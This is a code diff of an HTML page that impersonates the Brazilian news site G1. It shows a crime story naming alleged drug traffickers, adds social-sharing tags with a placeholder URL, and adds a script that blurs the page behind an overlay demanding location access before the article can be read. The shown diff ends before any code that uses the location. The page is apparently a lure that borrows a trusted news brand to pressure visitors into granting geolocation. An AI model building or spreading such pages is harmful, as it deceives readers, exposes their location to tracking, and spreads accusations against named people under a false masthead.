@@ -3,24 +3,38 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>G1 - Notícias</title>
+  <title>G1.globo.com - Notícias</title>
+
+  <!-- Open Graph (para WhatsApp, Facebook, etc.) -->
+  <meta property="og:title" content="Polícia identifica principais traficantes de 'droga da elite' no país" />
+  <meta property="og:description" content="Quadrilha liderada por jovem foragido movimenta milhões com o tráfico do dry e do ice — variações sofisticadas do haxixe puro." />
+  <meta property="og:image" content="https://sbtnews.sbt.com.br/_next/image?url=https%3A%2F%2Fsbt-news-assets-prod.s3.sa-east-1.amazonaws.com%2Fhaxixi_droga_da_elite_5c982b4753.jpeg&w=1920&q=90" />
+  <meta property="og:url" content="https://www.seusite.com.br" />
+  <meta property="og:type" content="website" />
+
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background-color: #f5f5f5;
+      color: #222;
+      position: relative;
+      overflow: auto;
     }
 
-    body.blurred *:not(#overlay) {
-      filter: blur(8px);
-      pointer-events: none;
-      user-select: none;
+    .top-image {
+      width: 100%;
+      max-height: 300px;
+      object-fit: cover;
+      display: block;
     }
 
     header {
       background-color: #c4170c;
       padding: 10px 20px;
       color: white;
+      position: relative;
+      z-index: 1;
     }
 
     header h1 {
@@ -33,6 +47,8 @@
       color: white;
       padding: 8px 20px;
       font-size: 14px;
+      position: relative;
+      z-index: 1;
     }
 
     .container {
@@ -41,12 +57,15 @@
       background: white;
       padding: 20px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+      z-index: 1;
     }
 
     .title {
       font-size: 26px;
       color: #c4170c;
       margin-bottom: 10px;
+      font-weight: bold;
     }
 
     .subinfo {
@@ -58,6 +77,7 @@
     .content {
       font-size: 18px;
       line-height: 1.6;
+      color: #333;
     }
 
     footer {
@@ -66,60 +86,66 @@
       text-align: center;
       padding: 10px;
       margin-top: 40px;
+      font-size: 14px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .blurred {
+      filter: blur(8px);
+      pointer-events: none;
+      user-select: none;
     }
 
     #overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.6);
-      z-index: 999;
+      background: rgba(0,0,0,0.4);
+      z-index: 10;
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-size: 18px;
       font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-
-    .background-image {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      z-index: -1;
-      filter: blur(8px);
+      user-select: none;
     }
   </style>
 </head>
-<body class="blurred">
+<body>
 
-  <!-- Imagem de fundo borrada -->
-  <img class="background-image" src="https://imgv2-1-f.scribdassets.com/img/document/639652429/original/932383e83d/1683522318?v=1" 
-       alt="Imagem de fundo de plantação" />
-
-  <!-- Overlay de bloqueio -->
-  <div id="overlay">Por favor, permita o acesso à sua localização para continuar</div>
+  <!-- Imagem no topo -->
+  <img class="top-image" src="https://sbtnews.sbt.com.br/_next/image?url=https%3A%2F%2Fsbt-news-assets-prod.s3.sa-east-1.amazonaws.com%2Fhaxixi_droga_da_elite_5c982b4753.jpeg&w=1920&q=90" 
+       alt="Droga da elite apreendida" />
 
   <header>
     <h1>G1</h1>
   </header>
 
   <nav>
-    <span>Notícias</span> &nbsp; | &nbsp; Política &nbsp; | &nbsp; Economia &nbsp; | &nbsp; Mundo &nbsp; | &nbsp; Tecnologia &nbsp; | &nbsp; Saúde
+    <span>Notícias</span> &nbsp; | &nbsp; Segurança &nbsp; | &nbsp; Investigação &nbsp; | &nbsp; Justiça &nbsp; | &nbsp; Crime Organizado
   </nav>
 
   <div class="container">
-    <div class="title">Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265</div>
-    <div class="subinfo">25/07/2025 15h30 - Atualizado há 2 horas</div>
+    <div class="title">Polícia identifica principais traficantes de "droga da elite" no país</div>
+    <div class="subinfo">31/07/2025 18h45 - Atualizado há poucos minutos</div>
+
     <div class="content">
-      <p>Uma plantação de maconha e um laboratório de drogas foram encontrados pela polícia dentro de uma residência localizada na BR-265, na zona rural de Lavras, em Minas Gerais. A operação foi conduzida pela Polícia Militar após denúncias anônimas.</p>
+      <p>Uma operação do Departamento de Investigações Criminais (Deic) revelou os nomes por trás da distribuição do “dry marroquino” e do “ice” — variações potentes e refinadas do haxixe, conhecidas como “droga da elite”. Com valor de mercado que pode atingir até R$ 60 mil por quilo, as substâncias circulam em ambientes de luxo, ostentadas por consumidores de alto poder aquisitivo.</p>
 
-      <p>Segundo as autoridades, no local foram apreendidas diversas mudas de cannabis, equipamentos para cultivo indoor e substâncias químicas usadas na fabricação de entorpecentes.</p>
+      <p>O principal suspeito é Pablo Henrique Gonçalves Porto Rodrigues, de 24 anos, atualmente foragido. Ele foi flagrado por investigadores negociando drogas ao lado de um Porsche, símbolo da ostentação promovida pela quadrilha. Carros de luxo, inclusive, são utilizados como parte do pagamento pelos entorpecentes.</p>
 
-      <p>O responsável pela residência foi preso em flagrante e encaminhado à delegacia da cidade. A Polícia Civil segue investigando o caso para identificar possíveis conexões com o tráfico regional.</p>
+      <p>Pablo foi monitorado durante conversas com comparsas por meio de áudios via celular. Em uma das mensagens, ele questiona a transferência de um veículo de forma quase casual: “O cara que tá com a Porsche não consegue fazer uma procuração? Até transferir? Porque demora de dois a três dias, tá ligado?”.</p>
+
+      <p>Outros nomes também foram identificados na hierarquia do grupo criminoso: Lucas Carvalho Silva, o “LK”; Matheus Madeira, conhecido como “Tom”; e Matheus Henrique Souza, o “Ratão”. Todos agem como braços operacionais da rede de tráfico.</p>
+
+      <p>Segundo a polícia, as drogas entram no Brasil principalmente por dois caminhos: via litoral, oriundas do Marrocos, e por terra, a partir do Uruguai. Ainda que alguns produtores brasileiros tentem replicar o processo, a qualidade não se equipara à do produto importado.</p>
+
+      <p>Um dado alarmante surgiu durante as investigações: criminosos presos continuam atuando ativamente na logística do tráfico. Um exemplo é Josemar Pires de Oliveira, recluso no Centro de Detenção Provisória de Tremembé, que enviou mensagens ao grupo sobre entregas em Campinas.</p>
+
+      <p>Nove integrantes da quadrilha já foram presos. Muitos foram flagrados em vídeo, distribuindo a droga ou transportando os carregamentos. Apesar do perfil “playboy” dos consumidores, os traficantes também seguem esse estilo de vida — com festas, carros de luxo e aparência de empresários de sucesso.</p>
+
+      <p>“Esses jovens, com alto padrão de vida e acesso a oportunidades, acabam entrando nesse tipo de crime por ganância, acreditando ser algo de baixo risco e alto retorno”, afirmou um dos delegados do caso.</p>
     </div>
   </div>
 
@@ -127,7 +153,11 @@
     © 2025 G1 - Todos os direitos reservados
   </footer>
 
+  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
+
   <script>
+    document.body.classList.add('blurred');
+
     function liberarConteudo() {
       document.body.classList.remove('blurred');
       document.getElementById('overlay').style.display = 'none';
